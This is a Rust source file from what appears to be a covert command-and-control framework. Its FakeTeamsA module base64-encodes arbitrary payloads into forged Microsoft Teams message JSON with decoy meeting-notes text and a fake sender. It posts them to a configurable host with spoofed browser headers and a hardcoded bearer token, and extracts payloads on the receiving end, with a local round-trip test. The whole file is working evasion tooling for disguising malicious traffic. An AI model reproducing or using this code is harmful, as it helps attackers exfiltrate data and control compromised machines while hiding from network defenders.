// zzz_core/src/transport/implementation/fake_teams_a.rs
#![allow(dead_code)]
use crate::binary_data_process::z_base::{Base64, Encoder as _};
use crate::transport::base::{TransportHttpA, TransportHttpType, TransportTrait};
use once_cell::sync::Lazy;
use rand::prelude::*;
use regex::Regex;
use serde_json::json;
use std::time::{SystemTime, UNIX_EPOCH};
use uuid::Uuid;
use crate::utils::base::join_url;

static RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""data"\s*:\s*"([A-Za-z0-9+/=]+)""#).unwrap()
});

pub struct FakeTeamsA;

impl TransportTrait for FakeTeamsA {
    const SUPPORT: &'static str = "zy:yz";
    const PROCESS: &'static str = "a";
    const MAX_PAYLOAD_SIZE: usize = 16 * 1024;

    type ExtractIn = TransportHttpType;
    type InjectIn = TransportHttpType;
    type InjectOut = TransportHttpType;

    fn extract(input: Self::ExtractIn) -> Option<Vec<u8>> {
        if let TransportHttpType::HttpRequest((_, bytes)) = input {
            let body_str = std::str::from_utf8(&bytes).ok()?;

            if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(body_str) {
                if let Some(payload_b64) = json_val["data"].as_str() {
                    return Base64::decode(payload_b64);
                }
            }
            let caps = RE.captures(body_str)?;
            let encoded_part = caps.get(1)?.as_str();
            Base64::decode(encoded_part)
        } else {
            None
        }
    }

    fn inject(input: Self::InjectIn) -> Option<Self::InjectOut> {
        if let TransportHttpType::Request((payload, urlpath, urlbase)) = input {
            if payload.len() > Self::MAX_PAYLOAD_SIZE {
                return None;
            }

            let encoded_payload = Base64::encode(payload);

            let message_id = Uuid::new_v4().to_string();
            let chat_id = Uuid::new_v4().to_string();
            let sender_id = Uuid::new_v4().to_string();
            let timestamp = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis();

            let teams_body = json!({
                "id": message_id,
                "chatId": chat_id,
                "type": "message",
                "createdDateTime": timestamp,
                "lastModifiedDateTime": timestamp,
                "from": {
                    "user": {
                        "id": sender_id,
                        "displayName": "张工",
                        "userPrincipalName": "zhanggong@company.com"
                    }
                },
                "body": {
                    "contentType": "html",
                    "content": "<div><p>会议纪要已更新，请查收</p></div>"
                },
                "importance": if thread_rng().gen_bool(0.5) { "normal" } else { "high" },
                "locale": "zh-CN",
                "data": encoded_payload,
                "extensions": {
                    "com.microsoft.teams": {
                        "version": "2.4.1",
                        "platform": "desktop",
                        "os": "Windows 10"
                    }
                },
                "replyTo": null,
                "mentions": [],
                "attachments": []
            });

            let full_url = join_url(&urlbase, &urlpath);

            let builder = reqwest::blocking::Client::new()
                .post(&full_url)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0 Teams/2.4.1")
                .header("Accept", "application/json, text/plain, */*")
                .header("Content-Type", "application/json")
                .header("Origin", urlbase.trim_end_matches('/'))
                .header("Referer", format!("{}/chats", urlbase.trim_end_matches('/')))
                .header("Sec-Fetch-Site", "same-origin")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Dest", "empty")
                .header("Authorization", "Bearer 4dfe1813-e5f4-42e4-a7cc-c248abf7f1d8")
                .header("x-ms-correlation-id", Uuid::new_v4().to_string())
                .json(&teams_body);

            Some(TransportHttpType::RequestBuilder(builder))
        } else {
            None
        }
    }
}

impl TransportHttpA for FakeTeamsA {}

#[cfg(test)]
pub mod tests {
    use super::*;
    use crate::transport::base::TransportHttpType as HTTP;
    use crate::web::base::WebServer;
    use actix_web::{web, HttpRequest, HttpResponse};
    use crate::web_register;

    const TEST_DATA: &[u8; 62] = b"f8d1763a-a376-40e9-9b1f8d1763a-a376-40e9-9b1e-40e5e0e5e917d96d";

    async fn teams_handler(req: HttpRequest, body: web::Bytes) -> HttpResponse {
        if let Some(extracted) = FakeTeamsA::extract(HTTP::HttpRequest((req, body))) {
            println!("[FakeTeamsA] 成功提取隐藏 payload，长度 = {} 字节", extracted.len());
            return HttpResponse::Ok()
                .content_type("application/json")
                .body(r#"{"id":"msg-123","status":"sent"}"#);
        }
        HttpResponse::BadRequest().body("No hidden payload found")
    }

    #[test]
    fn test_fake_teams_a_roundtrip() {
        let mut server = WebServer::new(0);

        web_register!(server {
            post "/api/v1/teams/chat/messages" => teams_handler,
        });

        let port = server.start().unwrap();
        let base_url = format!("http://127.0.0.1:{}", port);

        let urlbase = base_url.clone();
        let urlpath = "/api/v1/teams/chat/messages".to_string();
        let payload = Vec::from(TEST_DATA);

        let inject_result = FakeTeamsA::inject(HTTP::Request((payload.clone(), urlpath, urlbase)));

        assert!(inject_result.is_some(), "inject should return Some(RequestBuilder)");

        if let Some(HTTP::RequestBuilder(builder)) = inject_result {
            let response = builder.send().expect("Failed to send request");
            assert!(response.status().is_success(), "Server should return 200 OK");

            let text = response.text().unwrap();
            assert!(text.contains("\"status\":\"sent\""), "Should return success message");

            println!("FakeTeamsA 测试通过！隐藏 payload 已成功注入并提取。");
            println!("原始 payload 大小: {} 字节", TEST_DATA.len());
        }

        server.stop();
    }
}